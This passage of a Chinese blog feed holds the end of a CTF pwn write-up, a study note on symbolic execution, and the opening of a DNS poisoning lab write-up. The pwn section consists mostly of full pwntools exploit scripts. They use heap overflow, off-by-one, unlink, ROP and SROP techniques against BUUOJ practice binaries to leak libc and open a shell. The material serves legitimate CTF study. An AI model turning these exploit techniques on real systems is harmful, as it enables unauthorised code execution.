class="line">alloc(0x100,&#x27;a&#x27;,0x80,&#x27;a&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x108 + b&#x27;a&#x27;*8 + b&#x27;a&#x27;*0x80 + b&#x27;a&#x27;*8 + p32(free_got)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">edit(3,0x200,payload)</span><br><span class="line">dump(1)</span><br><span class="line">io.recvuntil(&#x27;description: &#x27;)</span><br><span class="line">free_addr = u32(io.recv(4))</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">edit(1,0x80,p32(sys_addr))</span><br><span class="line">delete(2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. summary 1.
好难...逆向以后本来就一大堆指针和函数调用，关系理都理不清还要利用，这道题的exp利用了“函数堆中利用指针去读写“的逻辑去覆写free_got的地址
2. 一些问题 1.
为什么LibcSearcher在本地就能查到正确的基址成功提权，到远程就不行了？ 1.
在本地freegot指向了540，而远端是750，本地libc版本号能查对，说明远端有什么问题
2. 那么这个问题是什么呢？</p>
<h1 id="x08-hitcontraining_heapcreator">0x08
hitcontraining_heapcreator</h1>
<p>Ⅰ. 解题知识点 1. off-by-one</p>
<p>Ⅱ. 完整EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25756</span><br><span class="line">file = &#x27;./heapcreator&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./heapcreator&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;, content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;heap :&#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">alloc(0x18,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + p64(0)*2 + p64(0x81)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0)*8 + p64(0x8) + p64(free_got)</span><br><span class="line">alloc(0x70,payload)</span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;Content : &#x27;)</span><br><span class="line">free_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">edit(2,payload)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. summary AK第二页<sub>完结撒flag</sub>
这道题基本就只把上一道题堆溢出检测改为off-by-one，其他基本没啥变动，可以算是第三道自己解出来的heap题~</p>
<h1 id="x09-hitcon2014_stkof">0x09 hitcon2014_stkof</h1>
<p>Ⅰ.知识点 1. unlink 2. 不关闭I/O缓冲区的后果</p>
<p>Ⅱ. 完整EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 26280</span><br><span class="line">file = &#x27;./stkof&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./stkof&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_repo2elf/64libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(&#x27;OK\n&#x27;)</span><br><span class="line">    </span><br><span class="line">def fill(idx, content):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(&#x27;OK\n&#x27;)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x30)</span><br><span class="line">alloc(0x30)</span><br><span class="line">alloc(0x80)</span><br><span class="line">alloc(0x30)</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">target = 0x602140 + 0x10</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line"></span><br><span class="line">payload = p64(0) + p64(0x30)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += b&quot;a&quot;*0x10</span><br><span class="line"></span><br><span class="line">payload += p64(0x30) + p64(0x90)</span><br><span class="line">fill(2,payload)</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*0x10</span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(2,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(1,payload)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:]+b&#x27;\x00\x00&#x27;)</span><br><span class="line"># log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(1,payload)</span><br><span class="line"></span><br><span class="line">fill(4,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="x0a-jarvisoj_level5">0x0A jarvisoj_level5</h1>
<p>国赛前复习一下栈题是怎么打的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./level3_x64&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = b&#x27;a&#x27; * (0x80 + 8) + p64(pop_rdi_ret) + p64(1)</span><br><span class="line">p1 += p64(pop_rsi_r15_ret) + p64(write_got) + p64(0)</span><br><span class="line">p1 += p64(write_plt) + p64(main_addr)</span><br><span class="line">io.sendline(p1)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;write_addr   ---&gt;   &#x27; + hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * (0x80 + 8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="x0b-ciscn_2019_es_7">0x0B ciscn_2019_es_7</h1>
<p>SROP,pwntools的集成真香</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28329&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./ciscn_2019_es_7&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">vuln_addr = 0x4004f1</span><br><span class="line">sig_return = 0x4004da</span><br><span class="line">execve_addr = 0x4004e2</span><br><span class="line">syscall_ret = 0x400517</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">bin_sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = bin_sh.ljust(0x10,b&#x27;a&#x27;)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;stack_addr   =&gt;   &quot;,hex(stack_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr - 328</span><br><span class="line">print(&quot;bin_sh_addr   =&gt;   &quot;,hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload  = bin_sh.ljust(0x10,b&#x27;a&#x27;)</span><br><span class="line">payload += p64(sig_return)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = 0</span><br><span class="line">sigframe.rdx = 0</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line"></span><br><span class="line">payload += bytes(sigframe)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x0c">0x0C</h1>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (1) -- Basis</title>
    <url>/posts/18908.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第一步——
</blockquote>
<span id="more"></span>
<h1 id="x00-基本模型">0x00 基本模型</h1>
<ul>
<li><p><strong>概述</strong><br />
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure> 调用<span
class="math inline">\(sum(1,2)\)</span>，学过C语言的都知道会发生什么事情<br />
但如果我调用<span
class="math inline">\(sum(a1,a2)\)</span>，并且我在这之前并未声明a1，a2呢？<br />
先不要用C语言的思路来考虑了，我们称这种情况为<strong>符号执行(Symbolic
Execution)</strong>，具体会发生什么我们接着往下看</p></li>
<li><p><strong>基本思想</strong></p>
<ol type="1">
<li>使用符号变量代替具体值作为程序或函数的参数，并模拟执行程序中的指令，各指令的操作都基于符号变量进行，其中操作数的值由符号和常量组成的表达式来表示
<ol type="1">
<li>符号变量是什么？
<ol type="1">
<li>读者可以将符号执行视为程序具体执行的自然扩展，符号变量使得程序执行变得不确定，当我们给一系列符号赋一个确定的值时，符号执行就成为了程序具体执行（i.e.
程序的一次具体执行可以视为符号执行的一次实例）</li>
</ol></li>
<li>操作数是什么？</li>
</ol></li>
<li>对于任意程序，其执行流程是由执行序列的执行语义控制的
<ol type="1">
<li>执行语义：
<ol type="1">
<li>变量定义语句对数据对象的描述 <code>int a;</code></li>
<li>声明语句对程序数据对象的修改 <code>a = 10;</code></li>
<li>条件语句对程序执行流程的控制</li>
</ol></li>
</ol></li>
<li>当程序的输入参数确定时，其指令序列被固定，因此程序执行语义和控制流也被固定</li>
</ol></li>
<li><p><strong>程序语言定义</strong></p>
<ol type="1">
<li>James C. King在提出符号执行技术的同时，也为其限定了理想的适用场景：
<ol type="1">
<li>理想模型中程序只处理“有符号整数”</li>
<li>程序“执行数”规模有限</li>
<li>可以处理程序内所有if条件语句的约束表达式</li>
</ol></li>
<li>基于符号执行技术的理想场景，对程序语言做如下定义
<ol type="1">
<li>程序变量类型：只包含“有符号整数”</li>
<li>程序语句类型
<ol type="1">
<li>简单声明语句，如<code>a = 3</code></li>
<li>if条件语句(包括then 和 else)</li>
<li>无条件跳转语句，如goto语句</li>
<li>变量操作语句：如read函数、基本整数运算操作（+、-、*）</li>
</ol></li>
<li>程序语义
<ol type="1">
<li>简单声明语句、无条件跳转语句和变量操作语句，只是将程序中的具体值替换为了符号</li>
<li>而if条件语句中，将具体值替换为了符号，所以我们无法判断if语句中的真值，就不能确定条件分支的走向，这是符号执行技术对程序执行语义的最大改变，也是符号执行与具体执行的关键区别</li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>程序执行状态</strong></p>
<ul>
<li>PC
<ol type="1">
<li>为了解决“分支走向不确定”的问题，King为程序状态新添加了一个变量：<strong>路径约束条件
pc(path
constraint)</strong>，在每个if条件语句处并没有实际决定程序执行哪个分支，这就需要符号执行引擎<strong>主动选择执行分支</strong>并<strong>记录整个执行过程</strong>，pc就辅助完成了这项工作</li>
<li>Simply，pc就是符号执行过程中对路径上条件分支走向的选择情况</li>
<li>来看一段示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
<li>假设上述三个分支中选择了if1:true if2:true
if3:false，pc表示为<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>，由此可见，pc是一个bool表达式</li>
</ol></li>
<li>符号执行引擎
<ul>
<li>当符号执行到 if(q) 时，pc 有可能包含q（1），也可能包含
~q（2），如果符号执行引擎选择进入then分支，则 pc
表现为（1）的形式，如果符号执行引擎选择进入else分支， 则 pc
表现为（2）的形式</li>
<li>而我们希望两条分支都被测试，所以符号执行引擎执行到if条件语句时，符号执行需要创建两个“并行”的执行过程</li>
<li>每个和符号变量相关的if条件语句都会为pc贡献一个决定程序执行走向的表达式，最后要确定pc对应路径的程序输入参数，只需要用约束求解器对pc进行求解</li>
</ul></li>
</ul></li>
<li><p><strong>符号执行树</strong></p>
<ol type="1">
<li>定义：用来描述程序执行路径的树形结构</li>
<li>内容：一个节点对应程序中的一条语句，还可以包含指令计数、PC、变量值等程序执行状态信息(没找到合适的图，就先放一张不带C代码的)
<img
src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" /></li>
</ol></li>
<li><p><strong>约束求解</strong></p>
<ol type="1">
<li>定义：
<ol type="1">
<li>给定一个三元组&lt;V,D,C&gt;,其中：
<ol type="1">
<li>V: 变量的有限集合<br />
</li>
<li>D: 变量的论域，变量可能取值的有限集合<br />
</li>
<li>C: 有限约束集合，某个约束关系<span
class="math inline">\(C_i\)</span>包含V中一个或多个变量，若<span
class="math inline">\(C_i\)</span>包含k个变量，则称其为在这k个变量集合上的k元约束<br />
</li>
</ol></li>
<li>约束求解就是找到约束问题的一个解，该解对变量集合中所有变量都赋一个取自其论域的值，并且这些变量的值满足该问题的所有约束条件<br />
</li>
<li>对于约束问题<span class="math inline">\(P =
&lt;V,D,C&gt;\)</span>，若P至少存在一个解，则称P为可满足的，否则称其为不可满足的<br />
</li>
</ol></li>
<li>分类:
<ol type="1">
<li>SAT(The Satisfiability problem, 可满足性问题)
<ol type="1">
<li>定义：求解由<strong>布尔变量集合</strong>所构成的布尔函数，是否存在变量的一种分布使得该函数的取值为1<br />
</li>
<li>缺陷：①只能解决命题逻辑公式问题，很多实际问题转化不成命题逻辑问题②必须用布尔变量来表示，将实际问题转化为布尔函数开销大，转换后的函数也极其复杂<br />
</li>
</ol></li>
<li>SMT(Satisfiability Modulo Theories, 可满足性模理论)
<ol type="1">
<li>定义：将SAT只能求解命题逻辑公式问题扩展为可以解决一阶逻辑所表达的公式。包含多种理论。
<ol type="1">
<li>什么是一阶逻辑</li>
</ol></li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>回到开始的函数</strong></p></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure>
<p>我们将其写为<em>类PL/1语言</em> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
<p>我们在调用<span
class="math inline">\(sum(1,2)\)</span>后，可以列一个表格来观察程序流<br />
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    2 &amp; 1 &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    3 &amp; 1 &amp; 2 &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    4 &amp; 1 &amp; 2 &amp; 3 &amp; 1 &amp; 2 &amp; true \cr \hline
\end{array}
\]</span> &gt; Line 5是return 3 (Katex不支持合并单元格，理解万岁)</p>
<p>我们在调用<span
class="math inline">\(sum(a1,a2)\)</span>后，就是把具体值换成了对应的符号
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    2 &amp; a1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    3 &amp; a1 &amp; a2 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    4 &amp; a1 &amp; a2 &amp; a3 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<blockquote>
<p>Line 5是return (a1+a2)</p>
</blockquote>
<p>既然符号执行与具体值执行最大的区别是if条件语句，那么我们写一个带有if语句的程序来看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
<p>这个函数转化为C就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">power</span><span class="params">(<span class="type">int</span> X, <span class="type">int</span> Y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> Z = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> J = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续用表格的格式来看</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        2 &amp; 1 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        3 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<p>前三行都很正常，直到第五行进行判断<br />
1. 处理判断语句 <code>Y&gt;=J</code> 得到约束条件 <code>a2&gt;=1</code>
2. 生成两个分支的路径约束条件：<br />
- (a2&gt;=1) <span class="math inline">\(\subset\)</span> true -
~(a2&gt;=1) <span class="math inline">\(\subset\)</span> true 3.
两个路径约束都可满足，分别对两个路径进行探索</p>
<p>对于分支: ~(a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; ~(a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后马上在Line 12处得到(return 1 when a2&lt;1)，探索完成</p>
<p>对于分支: (a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        7 &amp; a1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        8 &amp; a1 &amp; 2 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后因为Line
9，程序会跳回第四行继续判断语句，会产生两个新的分支，就陷入了无限循环，这不是我们想要的。</p>
<p>可是循环在一个程序中经常出现，该怎么解决这一问题？我们接着往后看</p>
<h1 id="x01-动态符号执行技术dse">0x01 动态符号执行技术(DSE)</h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>以具体的数值作为输入，执行程序代码，在程序实际执行路径的基础上：
<ol type="1">
<li>用符号执行技术对路径进行分析</li>
<li>提取路径的约束表达式</li>
<li>根据路径搜索策略(深度、广度)对约束表达式进行变形</li>
<li>求解变形后的表达式并生成新的测试用例</li>
<li>不断迭代上述过程，直到完全遍历程序的所有执行路径</li>
</ol></li>
<li>DSE的出现是为了解决静态SE①执行效率低②系统开销大③误报率高的问题</li>
</ol></li>
<li><strong>实现细节(以函数为例)</strong>
<ol type="1">
<li>场景：<code>void func(int a,int b)</code>,调用<code>func(X,Y)</code></li>
<li>Step1: 生成一组随机输入，开始"实际执行"</li>
<li>Step2:
<strong>同时</strong>符号引擎开始符号执行，按照“实际执行”的“执行路径”上的分支条件语句的“谓词”，搜集所有符号约束条件及其对应真值</li>
<li>Step3:
根据收集到的符号约束条件，按照一定路径选择策略，构造出一条新的可行路径约束
<ul>
<li>举个例子：深度优先策略</li>
<li>如果<code>pc = p1 ∩ p2 ∩ p3</code>,
深度优先就是将最后一个谓词(对不起jo太郎😭离散没学好忘了这个p3叫啥了)取非，变为<code>p1 ∩ p2 ∩ ~p3</code></li>
</ul></li>
<li>Step4: 使用约束求解器求解出新约束集合对应的具体输入</li>
<li>Step5: 重复上述过程，直到遍历全部路径</li>
</ol></li>
<li><strong>DSE工具SAGE</strong>
<ol type="1">
<li>原理粗略地过了一遍，大段大段的看不懂😭这里就不花时间总结了</li>
<li>SAGE基于x86的机器码进行符号执行，原因如下：
<ol type="1">
<li>屏蔽不同编程语言、编译器及编译平台对分析过程的影响，具有更强的复用性</li>
<li>忽略编译器"代码优化""代码混淆""基本块转换"等使代码语义发生变化的操作，有利于确定程序实际存在的漏洞</li>
<li>闭源分析yyds</li>
</ol></li>
</ol></li>
<li><strong>关键问题</strong>
<ol type="1">
<li>外部函数调用</li>
<li>循环问题：路径爆炸</li>
</ol></li>
</ul>
<blockquote>
<p>这一段也不仔细读了...用到再学</p>
</blockquote>
<h1 id="x02-并行符号执行技术pse">0x02
<strong>并行符号执行技术(PSE)</strong></h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>很多情况下符号执行引擎无法继续运行的原因是内存不足，所以我们希望通过计算集群可无穷扩展的内存空间和CPU来缓解路径爆炸问题</li>
<li>分布式...这我就先不看了</li>
</ol></li>
</ul>
<h1 id="x03-参考文献">0x03 参考文献</h1>
<p>1《软件安全分析与应用》</p>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>Web - DNS Poisoning</title>
    <url>/posts/27164.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
记录一下这学期最难的一次网络安全实验，恰逢期末，之后回来填坑
</blockquote>
<span id="more"></span>
<h1 id="虚拟机-virtualbox-配置">[1] 虚拟机 virtualbox 配置</h1>
<p><a
href="https://blog.csdn.net/luo15242208310/article/details/121581827">如何便捷地
copy 虚拟机</a>(直到写这篇 wp 才想起来可以 STFW，我最开始用的
vdi...还需要用
<code>VBoxManage internalcommands sethduuid /path/to/your.vdi</code>
重新解绑uuid)</p>
<p>由于此次打开的虚拟机较多，所以每个虚拟机内存只分配2GB即可</p>
<p>之后，把双向粘贴板和双向拖放打开，再把“显示 -&gt;
屏幕”中扩展特性的“启用3D加速”打开（要不然会花屏）</p>
<p>之后再在“网络 -&gt;
